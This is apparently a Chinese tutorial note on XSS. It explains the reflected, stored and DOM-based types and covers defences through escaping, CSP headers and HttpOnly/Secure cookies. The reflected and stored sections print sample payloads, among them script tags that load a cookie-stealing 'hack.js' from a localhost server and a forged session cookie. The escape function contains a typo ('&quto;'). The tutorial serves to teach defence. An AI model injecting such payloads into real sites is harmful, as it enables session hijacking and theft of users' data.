---
title: 安全01 XSS攻击
sidebar: 'auto'
date: 2021-11-06
categories:
- 11安全
isShowComments: true
---



## 1. 什么是XSS攻击

​	Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行，从而获取用户的敏感信息如 Cookie、SessionID 等

## 2. XSS攻击分类

### 1）反射型

> 攻击流程

1.   黑客构造出包含脚本的URL
2.   用户点击URL时，网站服务器就会将脚本从URL中取出，拼接在HTML中返回给浏览器
3.   用户浏览器接受到响应后解析执行，脚本也被执行
4.   脚本就可以窃取用户的数据，发送给黑客的服务器

![截图](https://gitee.com/ljcdzh/my_pic/raw/master/img/202111060819994.png)



> 实例

```js
// 普通
http://localhost:3000/?from=china

// alert尝试
http://localhost:3000/?from=<script>alert(3)</script>

// 获取Cookie
http://localhost:3000/?from=<script src="http://localhost:4000/hack.js">
</script>

// 短域名伪造 https://dwz.cn/

// 伪造cookie入侵 chrome
document.cookie="kaikeba:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjoxNTUzNT
Y1MDAxODYxLCJfbWF4QWdlIjo4NjQwMDAwMH0="
```



:::tip

​	Web 服务器不会存储反射型 XSS 攻击的恶意脚本，这是和存储型 XSS 攻击不同的地方。

:::



### 2）存储型

> 攻击流程

1.   黑客通过论坛发帖、商品评论等途径，将脚本提交到目标网站的数据库中
2.   用户打开网站时，网站服务器将脚本从数据库中取出，拼接在HTML中返回给浏览器
3.   用户浏览器接受响应后解析执行，脚本也被执行
4.   脚本就可以窃取用户数据发送给黑客网站

![截图](https://gitee.com/ljcdzh/my_pic/raw/master/img/202111060906009.png)

> 攻击实例

```js
// 评论
<script>alert(1)</script>

// 跨站脚本注入
我来了<script src="http://localhost:4000/hack.js"></script>
```



### 3）DOM型

> 攻击流程

​	基于 DOM 的 XSS 攻击是不牵涉到页面 Web 服务器的。具体来讲，黑客通过各种手段将恶意脚本注入用户的页面中，比如通过网络劫持在页面传输过程中修改 HTML 页面的内容，这种劫持类型很多，有通过 WiFi 路由器劫持的，有通过本地恶意软件来劫持的，它们的共同点是在 **Web 资源传输过程或者在用户使用页面的过程中修改 Web 页面的数据**



> DOM型与其他两种XSS的区别

DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。

> 实例

​	例如，黑客构造带有恶意代码的 URL 诱导用户打开 http://www.xxx.com/index.html/?content=，浏览器收到请求后解析执行，如果使用 document.write() 、document.outerHTML 、DOM .innerHTML未经转义输出，就可能遭到攻击。

![2图](https://gitee.com/ljcdzh/my_pic/raw/master/img/202111060916056.png)



## 3. 防御

### 1）转义

​	从浏览器的执行进行预防：

#### 1. **replace**

```js
function escape(str) {
  str = str.replace(/&/g, '&amp;')
  str = str.replace(/</g, '&lt;')
  str = str.replace(/>/g, '&gt;')
  str = str.replace(/"/g, '&quto;')
  str = str.replace(/'/g, '&#39;')
  str = str.replace(/`/g, '&#96;')
  str = str.replace(/\//g, '&#x2F;')
  return str
}
```

#### 2. **innerHTML**

```js
function filterStr(str) {
    const div = document.createElement('div')
    div.textContent = str
    return div.innerHTML
}
filterStr('<div></div>') // &lt;div&gt;&lt;/div&gt;
```



### 2）白名单

​	使用CSP， CSP的本质是简历一个白名单，告诉浏览器哪些外部资源可以加载和执行，从而防止恶意代码的注入攻击。

> CSP的功能？

- **限制加载其他域下的资源文件**。这样即使黑客插入了一个js文件，这个js文件也是无法被加载的。
- **禁止第三方域提交数据**。这样用户数据也不会外泄。
- **禁止执行内联脚本和未授权的脚本**。
- **还提供了上报机制**。这样可以帮助我们尽快发现有哪些XSS攻击，以便尽快修复问题。



#### 1. Content-Security-Policy

设置HTTP Header的Content-Security-Policy

![img](https://gitee.com/ljcdzh/my_pic/raw/master/img/202111060858557.jpeg)

```js
Content-Security-Policy:
	script-src 'self'; 
	object-src 'none';
	style-src cdn.example.org third-party.org; 
	child-src https:
```



#### 2. meta标签

```js
<meta 
	http-equiv="Content-Security-Policy" 
	content="script-src 'self'; 
	object-src 'none'; 
	style-src cdn.example.org third-party.org; 
	child-src https:
/>
```

上面代码中，CSP做了如下 配置：

-   脚本：只信任当前域名
-   `<object>`标签：不信任任何URL，即不加载任何资源
-   样式表：只信任`cdn.example.org`和`third-party.org`
-   框架（frame）：必须使用HTTPS协议加载
-   其他资源：没有限制



### 3） 防止脚本读取Cookie

#### 1. Cookie HttpOnly

​	如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie的信息。

​	通常**服务器**可以将某些 Cookie 设置为 HttpOnly 标志，HttpOnly 是服务器通过 **HTTP 响应头**来设置的。

> 实例

```js
// 设置cookie
response.addHeader("Set-Cookie", "uid=112;Path=/;HttpOnly")

// 设置多个cookie
response.addHeader("Set-Cookie", "uid=112;Path=/;HttpOnly")
response.addHeader("Set-Cookie", "uid=112;Path=/test;HttpOnly")

```

#### 2. Cookie Secure

​	Cookie添加Secure属性，只能https协议才能传输cookie, 防止中间人截取传输的cookie。

​	



> 实例

```js
// 设置https的cookie
response.addHeader("Set-Cookie", "uid=112;Path=/;Secure")
```





## 参考

1.   [前端安全系列（一）：如何防止XSS攻击？](https://juejin.cn/post/6844903685122703367#heading-6)
2.   [浏览器专题系列 - Web安全](https://juejin.cn/post/6926726800793927693)
3.   [Web 安全 - 跨站脚本攻击 XSS 三种类型及防御措施](https://mp.weixin.qq.com/s/7ruF1I94p4Ve3tVDb6096A)
4.   [Content Security Policy 入门教程](http://www.ruanyifeng.com/blog/2016/09/csp.html)





